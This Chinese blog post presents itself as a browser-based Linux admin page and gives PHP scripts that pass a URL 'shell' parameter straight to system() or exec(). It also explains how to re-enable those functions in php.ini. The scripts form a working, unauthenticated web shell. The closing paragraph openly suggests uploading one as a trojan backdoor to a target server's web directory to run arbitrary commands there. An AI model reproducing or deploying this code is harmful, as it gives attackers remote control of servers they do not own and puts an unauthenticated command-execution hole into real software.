
--- 
title:  网页Linux管理系统——通过网址提交Linux命令，获取执行结果 
tags: []
categories: [] 

---
## **目录**





 











 

·<img src="https://img-blog.csdnimg.cn/9b976f702133483abebd6ced96fffe96.gif" alt="9b976f702133483abebd6ced96fffe96.gif">

 

 

#### 网页提交Linux命令

在做Linux服务器管理的时候，我们都需要登录到服务器上，来执行命令，获取服务器的相关进程、状态、磁盘空间使用情况等等。

那么我们 可不可以，直接在网页端，通过访问Linux服务器的某个网页管理界面。在浏览器中输入Linux命令，直接在网页上获取命令执行结果呢？

#### 先上效果

直接通过http链接，传入命令参数，执行并返回结果。

<img src="https://img-blog.csdnimg.cn/20210419151611411.gif" alt="20210419151611411.gif">

####  

#### 环境要求

php执行shell命令，可以使用下面几个函数： 

```
string system ( string $command [, int &amp;$return_var ] )

string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )

void passthru ( string $command [, int &amp;$return_var ] )
```

#### 　注意：

这三个函数在默认的情况下，都是被禁止了的

如果要使用这几个函数，

就要先修改php的配置文件php.ini

查找关键字disable_functions，将这一项中的这几个函数名删除掉

然后注意重启apache。

 

#### 　　首先看一下system()和passthru()两个功能类似，可以互换：

```
&lt;?php
    #获取网页传递参数
    $shell = $_REQUEST['shell'];
    echo "&lt;pre&gt;";
    system($shell, $status);
    echo "&lt;/pre&gt;";
    //注意shell命令的执行结果和执行返回的状态值的对应关系
    $shell = "&lt;font color='red'&gt;$shell&lt;/font&gt;";
    if( $status ){
        echo "shell命令{$shell}执行失败";
    } else {
        echo "shell命令{$shell}成功执行";
    }
?&gt;
```

 

访问地址，并传递shell参数



<img src="https://img-blog.csdnimg.cn/20200903092202440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70" alt="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70">

　　注意，system()会将shell命令执行之后，立马显示结果，这一点会比较不方便，因为我们有时候不需要结果立马输出，甚至不需要输出，于是可以用到exec()

#### 　　<img src="https://img-blog.csdnimg.cn/11a0deb2dafd481a8a7f2b974c0efa3a.png" alt="11a0deb2dafd481a8a7f2b974c0efa3a.png">

 

 

#### 　　exec(）的使用示例： 

```
&lt;?php
    $shell = $_REQUEST['shell'];
    exec($shell, $result, $status);
    $shell = "&lt;font color='red'&gt;$shell&lt;/font&gt;";
    echo "&lt;pre&gt;";
    if( $status ){
        echo "shell命令{$shell}执行失败";
    } else {
        echo "shell命令{$shell}成功执行, 结果如下&lt;hr&gt;";
        print_r( $result );
    }
    echo "&lt;/pre&gt;";
?&gt;
```

exec()执行shell命令成功，但是并不返回结果，需要使用输出命令，输出$result结果

 

<img src="https://img-blog.csdnimg.cn/20200903093847827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70" alt="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70">

作为木马小后门，上传到对方服务器下的网站目录下，访问该地址，就可以在靶机上执行你想执行的命令，并且拿到回显结果。

<img src="https://img-blog.csdnimg.cn/4b6e634b74814893b61cf43eb996d755.png" alt="4b6e634b74814893b61cf43eb996d755.png">

 

 

 
